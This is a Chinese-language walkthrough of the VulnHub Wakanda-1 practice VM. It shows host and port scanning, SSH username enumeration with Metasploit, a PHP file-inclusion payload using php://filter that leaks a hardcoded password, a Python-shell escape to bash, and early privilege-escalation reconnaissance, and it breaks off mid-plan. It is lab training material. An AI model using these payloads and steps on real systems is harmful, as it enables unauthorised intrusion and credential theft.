---
title: 渗透靶机
category: 
- 渗透测试
tags: 
- Docker
- 漏洞复现
---

### 漏洞信息

### 靶机信息

[Wakanda-1](https://www.vulnhub.com/entry/wakanda-1,251/)是来自[VulnHub](https://www.vulnhub.com/)的渗透测试靶机， 下载地址为https://www.vulnhub.com/entry/wakanda-1,251/#download ，下载下来的是一个OVA格式的虚拟机，可在VMware或VirtualBox中打开。虚拟机已设置DHCP，可自动获取IP。渗透目标是获取三个flag（ flag1.txt, flag2.txt, root.txt ）。

### 漏洞环境搭建

- 下载ova镜像后载入virtualbox 打开靶机

- 启动kali攻击环境

note:一般kali使用Vmware安装的，而下载下来的ova镜像vmware打不开。解决方案为给kali再加一块网卡设置为直连物理网络，这样kali机就可以访问到靶机了。

这里假设我们知道靶机所在网段为192.168.56.101

使用kali进行主机探测：

```
fping 192.168.56.0/24 -g > 56.txt
grep alive 56.txt
```

结果如下：

![image-20201209221845804](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209221845804.png)

逐一识别后，确定靶机ip为192.168.56.101

![image-20201209222127372](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209222127372.png)

<!-- more -->

### 信息收集

1. 端口服务扫描
2. 操作系统识别

```bash
nmap -sV -Pn -n -O 192.168.56.101
```

![image-20201209222655279](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209222655279.png)

80端口提供web服务，操作系统大概是linux 3.2

没有可用cve。试着从80口下手：

### web 信息收集

探测web脚本语言：

![image-20201209223128496](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209223128496.png)

异常报404 正常显示。大概率是php

查看源码发现一个可疑超链接 版权信息：和一行注释代码：

```html
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
```

试着指定参数lang=fr,get方式提交。

语言显示成了法语。

![image-20201209223522783](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209223522783.png)

暂时记下：

- 一个可疑版权声明的链接
- 一个lang参数

使用dirbuster 进行web目录爆破：

![image-20201209225250169](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209225250169.png)

### SSH 用户枚举

这里根据先前收集到的信息：端口为3333  有个可疑版权声明（潜在用户名）使用msf枚举ssh用户模块：

代码如下：

  

```bash
msf-console
use auxiliary/scanner/ssh/ssh_enumusers
set rhost 192.168.56.101
set rport 3333
set user_file ssh_us.txt
exploit
```

![image-20201209231926724](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209231926724.png)

结果显示：成功探测到两个用户名:

1. root
2. mamadou

### 漏洞利用

接下来也可以使用弱密码试试连接ssh但是作用不大。饶了一圈还是回到最开始的注释代码：

访问/?lang=fr 返回页面正常。再访问lang.php服务端返回200.

分析可得此处应该存在文件包含漏洞。服务端将lang参数的值拿去拼接一个.php文件后缀。

下面思路来源于网上[教程](https://blog.werner.wiki/penetrate-wakanda-1/)

了解上面这点，下面可以利用这个文件包含漏洞读取服务端隐私文件：思路可以说使用暴力枚举的方式尽可能多的探测到服务隐私文件。

思路：使用burp暴力枚举可能存在的隐私文件：

![image-20201209235117323](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209235117323.png)

可以看到：当lang的值为index时，服务端返回了500。前面我们已经知道index是存在的。这里使用php的filter协议转换编码读取index.php的文件内容：

```
http://192.168.56.101/index.php?lang=php://filter/read=convert.base64-encode/resource=index
```

返回了index.php的源码：

![image-20201209235718639](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201209235718639.png)

```
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
```

base64解编码后得到源码如下：

```php+HTML
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>
```

得到一个明文密码：Niamey4Ever227!!!

用之前的账户进行登录：最后mamadou 用户名登录成功。

![image-20201210000629155](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210000629155.png)

成功登录。但只能进入pythonshell。退出后需要重新登录。是一个低权限用户：

接下来首先使用pythonshell获得bashshell权限：

```bash
import os 
os.system("/bin/bash")
```

![image-20201210001404186](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210001404186.png)

- 查看用户家目录发现falg1
- 获得内核版本。
- 但无root权限

接下来就查看www下面的文件：

![image-20201210002256911](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210002256911.png)

并不是我们要得。同时有提示叫我查看邮箱。看了一下好像是root用户发来的维护信息：先放着

![image-20201210002758275](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210002758275.png)

接下来试着获取其它用户：

读取/etc/passed 文件或者直接进入home目录，发现有一个devops用户。进入后查看文件找到flag但是没有权限。

![image-20201210003502059](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210003502059.png)

到这一步可以梳理下思路了：

1. 针对系统服务进行exp利用
2. 可以将mamadou用户进行提权

首先肯定是探测一下系统服务漏洞，根据我们掌握的信息，知道靶机有apache服务、rcpbind服务、ssh服务。另外还需要掌握靶机的操作系统（这里是linux）是哪个linux 发行版以及linux 内核版本是多少。可以通过运行以下命令：

```bash
uname -a  ---探测系统内核
lsb_release -a ---探测发行版本
```

获得如下信息

![image-20201210221027013](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210221027013.png)

接着就进入系统以及服务漏洞利用了。在进行利用前首先要找到利用点。而kali 下有非常方便的搜索功能可以帮助我们快速查找exp。比如试试这样：

```bash
searchsploit Debian
```

```
searchsploit Apache
```

```
searchsploit Rcpbind
```

```
searchsploit ......
```

![image-20201210221332471](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210221332471.png)

仔细观察的话可以找到完美符合条件的exp：

1. 发行版为debian 8
2. linux内核为3.6
3. 利用成功后可达到权限提升的目的

这里有个限制，只能本地提权。思路是用wget 直接下载到靶机，再在靶机中运行。（关于这个有空再补）

**这里主要演示第二中方法**也就是枚举用户下的可执行文件进行提权。

首先先把属于两个用户的所有文件进行枚举：

![image-20201210221841566](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210221841566.png)

发现home没什么特别的下的文件。这里主要列出另外几个文件的详细信息：

mamadou用户下没什么有用的。dev目录下是字符设备。mail 下也分析不出什么。

进到/srv 下：发现信息

![image-20201210222544487](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210222544487.png)

这里这个python文件所属用户是devops，所属组是develeper组，且当前用户对其有读写权限。因此可以从这入手，从而越权。具体看看这个文件内容是否能利用：

![image-20201210222734588](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201210222734588.png)

内容很简单，将test 写入/tmp目录下:查看tmp目录发现已经存在该文件：所以目前的思路就是 通过python shell实现越权。